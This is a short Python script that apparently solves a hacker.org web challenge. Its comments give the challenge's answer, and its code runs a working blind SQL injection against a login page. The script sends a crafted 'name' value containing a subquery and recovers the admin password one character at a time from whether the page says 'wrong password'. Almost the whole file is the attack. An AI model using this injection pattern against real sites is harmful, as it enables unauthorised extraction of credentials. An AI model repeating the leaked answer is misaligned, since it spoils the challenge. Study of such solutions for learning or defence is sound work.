#!/usr/bin/env python3

# Q: http://www.hacker.org/challenge/chal.php?id=177
# A: http://www.hacker.org/challenge/chal.php?answer=grtpw4h4ck3rzyo&id=177&go=Submit

import re
import urllib.request

def main():
    BASE_URL = 'http://www.adum.com/fortknox/index.php'
    ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    PASSWORD_LENGTH = 15
    
    password = ''
    for _ in range(PASSWORD_LENGTH):
        for ch in ALPHABET:
            name = "admin' and (select password from user where name = 'admin') like '{prefix}%' or '' <> '".format(prefix=password + ch)
            source = urllib.request.urlopen('{base_url}?{parameters}'.format(base_url=BASE_URL, parameters=urllib.parse.urlencode({'name':name, 'password':''}))).read().decode()
            
            if re.search('wrong password', source):
                password += ch
                break
        print('password:', password + '_' * (PASSWORD_LENGTH - len(password)))

if __name__ == '__main__':
    main()
